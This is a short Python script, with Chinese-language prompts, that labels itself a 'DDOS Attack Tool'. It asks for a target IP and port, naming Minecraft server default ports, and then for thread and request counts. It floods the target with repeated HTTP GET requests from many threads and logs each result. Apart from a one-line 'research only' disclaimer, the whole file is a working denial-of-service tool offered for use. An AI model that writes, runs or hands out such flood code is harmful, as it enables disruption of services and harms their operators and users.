import requests
import threading
import time
import logging

# 配置日志
logging.basicConfig(filename='ddos_log.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 定义颜色常量
RED = "\033[91m"
RESET = "\033[0m"

print("| DDOS Attack Tool | Version 1.0 | By: aftree | wandsbin.github.io/ddos |")
print(RED + "本应用仅供讨论研究，请勿将本软件用于违法行为！" + RESET)
print("基岩版默认端口19132 JAVA版默认端口80")
# 目标IP地址和端口
target_ip = input("请输入目标IP: ")  # 示例IP地址，请替换为目标IP
target_port = int(input("请输入目标端口: "))  # 用户输入目标端口

# 模拟请求的URL
url = f'http://{target_ip}:{target_port}'

# 发送请求的线程数量
num_threads = int(input("输入发送请求的线程数量: "))

# 每个线程发送请求的数量
num_requests_per_thread = int(input("输入每个线程发送请求的数量: "))

# 请求间隔时间（秒）
request_interval = float(input("输入请求间隔时间（秒）: "))

def send_requests():
    for _ in range(num_requests_per_thread):
        try:
            response = requests.get(url)
            print(f'Sent request to {url}, status code: {response.status_code}')
            logging.info(f'Sent request to {url}, status code: {response.status_code}')
            time.sleep(request_interval)
        except Exception as e:
            print(f'Error sending request to {url}: {e}')
            logging.error(f'Error sending request to {url}: {e}')

def start_ddos_attack():
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    confirmation = input("确定要启动DDoS攻击吗？(y/n): ")
    if confirmation.lower() == 'y':
        print('正在启动攻击...')
        start_ddos_attack()
        print('攻击完成！')
    else:
        print('已取消攻击。')
